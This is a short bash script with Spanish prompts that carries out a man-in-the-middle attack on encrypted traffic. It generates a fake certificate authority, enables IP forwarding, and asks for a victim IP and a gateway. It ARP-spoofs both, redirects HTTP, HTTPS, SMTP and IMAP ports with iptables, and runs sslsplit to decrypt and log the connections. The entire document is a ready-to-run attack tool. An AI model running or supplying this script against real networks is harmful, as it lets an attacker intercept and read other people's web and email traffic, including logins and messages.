cd ..#! /bin/bash

echo "Creando Carpeta de Trabajo..."
mkdir /root/ataquessl/
cd /root/ataquessl/

echo “Generar certificado HTTPS falso:”

openssl genrsa -out /root/ataquessl/ca.key 2048

gnome-terminal -e "bash -c 'openssl req -new -x509 -days 1800 -key /root/ataquessl/ca.key -out /root/ataquessl/ca.crt'" 

echo “Habilitando IP Forwarding”
sleep 3
echo 1 > /proc/sys/net/ipv4/ip_forward

echo “OK…”
sleep 3
echo “Mostrando configuración de las Interfaces de red:”

ifconfig

echo “Selecciona Interfaz de Red: eth0, eth1….”

read INTERFAZ 

echo “Introduce la IP de la puerta de enlace:”

read GATEWAY

echo “Introduce la IP de la víctima:”

read VICTIMA 

echo "Realizando envenenamiento ARP"

gnome-terminal --tab -e "bash -c 'arpspoof -t $VICTIMA $GATEWAY -i $INTERFAZ'" --tab -e "bash -c 'arpspoof -t $GATEWAY $VICTIMA -i $INTERFAZ'" 

echo "Envenenamiento ARP realizado"

echo "Generando directorio de datos:"

mkdir logdir/

echo "Configurando IP TABLES para los servicios HTTP, HTTPS, SMTP, IMAP:"

iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 25 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443

echo "Ejecutando SSLSplit:"

sslsplit -D -l connection.log -S logdir/ -k /root/ataquessl/ca.key -c /root/ataquessl/ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
